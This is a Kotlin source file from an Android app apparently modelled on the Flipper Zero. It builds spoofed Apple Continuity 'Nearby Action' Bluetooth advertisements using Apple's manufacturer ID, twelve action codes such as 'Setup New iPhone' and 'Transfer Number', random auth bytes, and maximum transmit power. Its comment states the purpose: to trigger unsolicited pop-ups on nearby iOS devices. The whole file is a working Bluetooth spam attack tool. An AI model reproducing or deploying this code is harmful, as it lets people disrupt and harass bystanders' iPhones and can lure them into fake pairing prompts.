package com.example.flipperdroid.model.`object`

import com.example.flipperdroid.model.`class`.AdvertisementSet
import com.example.flipperdroid.model.`class`.ManufacturerSpecificData
import com.example.flipperdroid.model.enums.AdvertisementSetType
import com.example.flipperdroid.model.enums.AdvertisementTarget
import com.example.flipperdroid.model.enums.AdvertisementSetRange
import com.example.flipperdroid.model.enums.TxPowerLevel
import com.example.flipperdroid.model.enums.AdvertiseMode
import kotlin.random.Random

/**
 * Génère des trames Apple Continuity « Nearby Action » (type 0x0F) qui déclenchent
 * des pop-ups d'action sur les appareils iOS proches (Setup New iPhone, Transfer
 * Number, actions AppleTV/HomeKit, etc.).
 *
 * Format manufacturer data : [0x0F, 0x05, flags(0xC0), actionType, auth(3 octets aléatoires)].
 */
object ContinuityNearbyActionAdvertisementSetGenerator {
    private const val manufacturerId = 76 // 0x004C = Apple

    private val actions = linkedMapOf(
        0x13 to "AppleTV AutoFill",
        0x27 to "AppleTV Connecting…",
        0x20 to "Join This AppleTV?",
        0x19 to "AppleTV Audio Sync",
        0x1E to "AppleTV Color Balance",
        0x09 to "Setup New iPhone",
        0x02 to "Transfer Number",
        0x0B to "HomePod Setup",
        0x01 to "Setup New Apple TV",
        0x06 to "Pair AppleTV",
        0x0D to "HomeKit Appliance Setup",
        0x2B to "AppleID for AppleTV",
    )

    fun getAdvertisementSets(): List<AdvertisementSet> {
        val advertisementSets = mutableListOf<AdvertisementSet>()
        actions.forEach { (actionType, name) ->
            val advertisementSet = AdvertisementSet()
            advertisementSet.target = AdvertisementTarget.ADVERTISEMENT_TARGET_IOS
            advertisementSet.type = AdvertisementSetType.ADVERTISEMENT_TYPE_CONTINUITY_NEW_DEVICE
            advertisementSet.range = AdvertisementSetRange.ADVERTISEMENTSET_RANGE_CLOSE
            advertisementSet.advertiseSettings.advertiseMode = AdvertiseMode.ADVERTISEMODE_LOW_LATENCY
            advertisementSet.advertiseSettings.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertiseSettings.connectable = false
            advertisementSet.advertiseSettings.timeout = 0
            advertisementSet.advertisingSetParameters.legacyMode = true
            advertisementSet.advertisingSetParameters.txPowerLevel = TxPowerLevel.TX_POWER_HIGH
            advertisementSet.advertisingSetParameters.connectable = false
            advertisementSet.advertiseData.includeDeviceName = false
            advertisementSet.advertiseData.includeTxPower = false

            val manufacturerSpecificData = ManufacturerSpecificData()
            manufacturerSpecificData.manufacturerId = manufacturerId
            val header = byteArrayOf(0x0F, 0x05, 0xC0.toByte(), actionType.toByte())
            manufacturerSpecificData.manufacturerSpecificData = header + Random.nextBytes(3)
            advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)

            advertisementSet.title = "Action: $name"
            advertisementSets.add(advertisementSet)
        }
        return advertisementSets
    }
}
